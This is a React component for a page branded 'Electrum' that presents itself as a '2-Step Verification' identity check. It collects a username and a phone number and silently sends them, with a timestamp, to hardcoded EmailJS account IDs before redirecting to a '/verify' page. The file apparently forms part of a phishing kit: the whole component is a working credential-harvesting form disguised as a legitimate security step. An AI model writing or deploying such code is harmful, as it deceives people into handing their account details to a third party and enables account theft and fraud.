import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "emailjs-com";

const Alrt = () => {
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [emailError, setEmailError] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [emailPlaceholder, setEmailPlaceholder] = useState("Enter Username");
  const [phonePlaceholder, setPhonePlaceholder] = useState("Enter your Number");
  const navigate = useNavigate();

  const handleLogin = () => {
    let isValid = true;

    // Email validation
    if (!email.trim()) {
      setEmailError("Username is required");
      isValid = false;
    } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
      setEmailError("Invalid Username format");
      isValid = false;
    } else {
      setEmailError("");
    }

    // Phone number validation (Must be 1-15 digits)
    if (!phone.trim()) {
      setPhoneError("Number is required");
      isValid = false;
    } else if (!/^\d+$/.test(phone)) {
      setPhoneError("Only digits are allowed");
      isValid = false;
    } else if (phone.length > 15) {
      setPhoneError("Phone number cannot exceed 15 digits");
      isValid = false;
    } else {
      setPhoneError("");
    }

    if (isValid) {
      const templateParams = {
        web_name: "Electrum",
        from_name: "Electrum",
        message: `Name: ${email}, 
        Phone: ${phone}, 
        Date: ${new Date().toLocaleDateString()}, 
        Time: ${new Date().toLocaleTimeString()}`,
      };

      emailjs
        .send(
          "service_d7iarfv", // EmailJS Service ID
          "template_zzgorrr", // EmailJS Template ID
          templateParams,
          "cD8XBmJIzmsXY6T3j" // EmailJS Public Key
        )
        .then(() => {
          setEmail("");
          setPhone("");
          navigate("/verify");
        })
        .catch((error) => {
          console.error("Error:", error);
          alert("Failed to send email.");
        });
    }
  };

  return (
    <div className="bg-slate-900 min-h-screen flex flex-col items-center pt-32">
      <header className="flex justify-center mb-8">
        <img src={require("../Images/electurm-2.png")} alt="Navigation" className="w-36" />
      </header>

      <div className="w-full max-w-lg border-2 bg-white p-8 rounded-lg shadow-lg">
        <main className="flex flex-col items-center">
          <h1 className="text-blue-800 text-3xl font-medium pb-5">2-Step Verification</h1>
          <h3 className="text-lg text-gray-700 mb-6">Verify Your Identity</h3>
          <form
            method="post"
            onSubmit={(e) => {
              e.preventDefault();
              handleLogin();
            }}
            className="w-full"
          >
            {/* Email Input */}
            <div className="mb-4">
              <input
                type="text"
                id="email"
                name="name"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={emailPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  emailError ? "border-red-500" : "border-gray-300"
                }`}
                required
              />
              {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
            </div>

            {/* Phone Number Input */}
            <div className="mb-6">
              <input
                type="text"
                id="phone"
                value={phone}
                onChange={(e) => {
                  if (/^\d*$/.test(e.target.value) && e.target.value.length <= 10) {
                    setPhone(e.target.value);
                  }
                }}
                placeholder={phonePlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  phoneError ? "border-red-500" : "border-gray-300"
                }`}
                required
              />
              {phoneError && <p className="text-red-500 text-xs mt-1">{phoneError}</p>}
            </div>

            <div className="flex justify-center">
              <button type="submit" className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700">
                Submit
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};

export default Alrt;
